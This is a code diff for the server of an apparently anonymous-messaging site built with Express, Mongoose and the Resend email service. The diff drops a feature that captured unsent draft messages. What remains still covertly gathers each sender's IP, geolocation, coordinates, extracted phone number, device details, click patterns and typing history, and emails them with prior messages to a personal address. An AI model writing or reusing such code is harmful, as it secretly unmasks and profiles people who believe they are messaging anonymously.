@@ -52,7 +52,6 @@ const messageSchema = new mongoose.Schema({
   id: { type: Number, required: true },
   message: { type: String, required: true },
   timestamp: { type: String, required: true },
-  state: { type: String, enum: ['sent', 'unsent'], default: 'sent' },
   timeOnPage: Number,
   clickPatterns: [{ element: String, timestamp: Number }],
   textHistory: [{ text: String, timestamp: Number }],
@@ -99,7 +98,7 @@ if (resend) {
   console.log('⚠️ Resend email disabled (RESEND_API_KEY not set)');
 }
 
-async function sendEmail(subject, text, html, state = 'sent') {
+async function sendEmail(subject, text, html) {
   if (!resend) {
     console.log('❌ Email disabled: RESEND_API_KEY not set');
     console.log('Set RESEND_API_KEY environment variable to enable emails');
@@ -107,20 +106,19 @@ async function sendEmail(subject, text, html, state = 'sent') {
   }
 
   try {
-    const stateLabel = state === 'unsent' ? '(DRAFT)' : '';
     const fromEmail = process.env.FROM_EMAIL || 'onboarding@resend.dev';
     const toEmail = process.env.TO_EMAIL || 'isumuthsara2003@gmail.com';
     
-    console.log(`📧 Sending email - From: ${fromEmail}, To: ${toEmail}, State: ${state}`);
+    console.log(`📧 Sending email - From: ${fromEmail}, To: ${toEmail}`);
     
     await resend.emails.send({
       from: fromEmail,
       to: toEmail,
-      subject: `${stateLabel} ${subject}`,
+      subject: subject,
       text,
       html
     });
-    console.log(`✅ Email notification sent (State: ${state})`);
+    console.log(`✅ Email notification sent`);
   } catch (err) {
     console.error('❌ Email send failed:', err.message);
   }
@@ -198,27 +196,14 @@ function parseUserAgent(req) {
 // Post message
 app.post('/message', async (req, res) => {
   try {
-    // Normalize body to handle sendBeacon/fetch keepalive (may come as text/plain)
-    const contentType = req.headers['content-type'] || '';
-    let body = req.body;
-    if (typeof body === 'string') {
-      try {
-        body = JSON.parse(body);
-      } catch (e) {
-        console.warn('⚠️ Could not parse text body as JSON');
-        body = {};
-      }
-    }
-    console.log('📥 /message received:', { contentType, bodyType: typeof req.body, normType: typeof body, state: body?.state });
-
-    const { message } = body;
+    const { message } = req.body;
     if (!message?.trim()) {
       return res.status(400).json({ error: 'Message required' });
     }
 
     const ip = getClientIP(req);
     const { location, coordinates } = await getGeolocation(ip);
-    const clientCoordinates = body.coordinates || null;
+    const clientCoordinates = req.body.coordinates || null;
     const phoneAuto = extractPhone(req);
     const userAgent = parseUserAgent(req);
     const referrer = req.headers['referer'] || 'Direct';
@@ -229,29 +214,19 @@ app.post('/message', async (req, res) => {
       id: Date.now(),
       message: message.trim(),
       timestamp: new Date().toISOString(),
-      state: body.state || 'sent',
       ip,
       location,
       coordinates: clientCoordinates || coordinates,
-      timeOnPage: body.timeOnPage || null,
-      clickPatterns: body.clickPatterns || [],
-      textHistory: body.textHistory || [],
+      timeOnPage: req.body.timeOnPage || null,
+      clickPatterns: req.body.clickPatterns || [],
+      textHistory: req.body.textHistory || [],
       userAgent,
       referrer,
       source,
       language,
-      shareTag: body.shareTag || null
+      shareTag: req.body.shareTag || null
     };
     if (phoneAuto) newMessageData.phone = phoneAuto;
-
-    // Debug log for unsent vs sent
-    console.log('📨 Received message:', {
-      state: newMessageData.state,
-      length: newMessageData.message.length,
-      textHistoryLen: Array.isArray(newMessageData.textHistory) ? newMessageData.textHistory.length : 0,
-      referrer,
-      source
-    });
 
     // Save to MongoDB
     const newMessage = await Message.create(newMessageData);
@@ -273,7 +248,6 @@ app.post('/message', async (req, res) => {
       : null;
 
     const textBody = `
-Message State: ${newMessage.state === 'sent' ? 'SENT' : 'UNSENT (DRAFT)'}
 Message: ${newMessage.message}
 Time (Sri Lanka - UTC +5:30): ${new Date(new Date(newMessage.timestamp).getTime() + (5.5 * 60 * 60 * 1000)).toISOString().replace('T', ' ').slice(0, 19)}
 Time on Page: ${newMessage.timeOnPage ?? 'N/A'} seconds
@@ -296,7 +270,6 @@ User Previous Messages: ${previousMessages.length > 0 ? previousMessages.map(m =
     `.trim();
     const htmlBody = `
       <div style="font-family: Arial, sans-serif; line-height: 1.5;">
-        <p style="background-color: ${newMessage.state === 'sent' ? '#d4edda' : '#fff3cd'}; padding: 10px; border-radius: 5px; border-left: 4px solid ${newMessage.state === 'sent' ? '#28a745' : '#ffc107'};"><strong>Message State:</strong> <span style="font-size: 18px;">${newMessage.state === 'sent' ? '✅ SENT' : '📝 UNSENT (DRAFT)'}</span></p>
         <p><strong>Message:</strong> ${newMessage.message}</p>
         <p><strong>Time (Sri Lanka - UTC +5:30):</strong> ${new Date(new Date(newMessage.timestamp).getTime() + (5.5 * 60 * 60 * 1000)).toISOString().replace('T', ' ').slice(0, 19)}</p>
         <p><strong>Time on Page:</strong> ${newMessage.timeOnPage ?? 'N/A'} seconds</p>
@@ -320,7 +293,7 @@ User Previous Messages: ${previousMessages.length > 0 ? previousMessages.map(m =
       </div>
     `;
 
-    sendEmail('📩 New Anonymous Message', textBody, htmlBody, newMessage.state);
+    sendEmail('📩 New Anonymous Message', textBody, htmlBody);
 
     res.status(201).json({
       message: newMessage,
